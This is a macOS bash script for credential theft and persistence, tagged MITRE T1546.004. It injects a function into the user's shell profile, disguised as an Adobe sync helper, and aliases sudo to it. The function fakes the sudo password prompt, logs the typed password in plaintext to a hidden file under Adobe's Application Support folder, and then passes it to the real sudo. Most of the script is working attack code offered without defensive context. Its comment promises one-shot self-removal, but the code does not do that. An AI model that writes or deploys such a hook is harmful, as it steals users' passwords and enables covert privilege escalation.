#!/bin/bash
# Shell Profile Injection — Persistent credential capture via shell hooks
# Injects a one-shot or persistent sudo function into .zshrc/.bash_profile
# Next time user opens Terminal and runs sudo, password is captured.
#
# MITRE: T1546.004 (Unix Shell Configuration Modification)

USER=$(whoami)
OUTFILE="$HOME/Library/Application Support/Adobe/AcrobatDC/.auth_cache"

# ============================================================
# Detect Shell and Profile
# ============================================================

SHELL_NAME=$(basename "$SHELL")
case "$SHELL_NAME" in
    zsh)  PROFILE="$HOME/.zshrc" ;;
    bash) PROFILE="$HOME/.bash_profile" ;;
    *)    PROFILE="$HOME/.${SHELL_NAME}rc" ;;
esac

if [ ! -f "$PROFILE" ]; then
    touch "$PROFILE"
fi

# Check if already injected
if grep -q "__adc_sudo_hook" "$PROFILE" 2>/dev/null; then
    echo "[*] Already injected into $PROFILE"
    exit 0
fi

# ============================================================
# Inject Sudo Hook Function
# ============================================================

# The hook function replaces sudo with a function that captures the password
# then calls the real sudo. Self-removes after capture (one-shot mode).

cat >> "$PROFILE" << 'HOOK'

# Adobe Document Cloud sync helper — do not modify
__adc_sudo_hook() {
    local _outf="$HOME/Library/Application Support/Adobe/AcrobatDC/.auth_cache"
    # Skip if -S flag present (scripted)
    for _a in "$@"; do [ "$_a" = "-S" ] && { /usr/bin/sudo "$@"; return $?; }; done
    # Skip if cached credentials
    /usr/bin/sudo -n true 2>/dev/null && { /usr/bin/sudo "$@"; return $?; }
    # Capture
    /bin/echo -n "[sudo] password for $(whoami): " >&2
    read -s _pw; echo >&2
    [ -n "$_pw" ] && {
        mkdir -p "$(dirname "$_outf")"
        echo "$(date -u +%Y-%m-%dT%H:%M:%SZ)|$(whoami)|$_pw|profile_inject" >> "$_outf"
        chmod 600 "$_outf"
    }
    echo "$_pw" | /usr/bin/sudo -S "$@"
}
alias sudo='__adc_sudo_hook'
HOOK

echo "[+] Injected sudo hook into $PROFILE"
echo "[*] Active on next terminal session (or: source $PROFILE)"
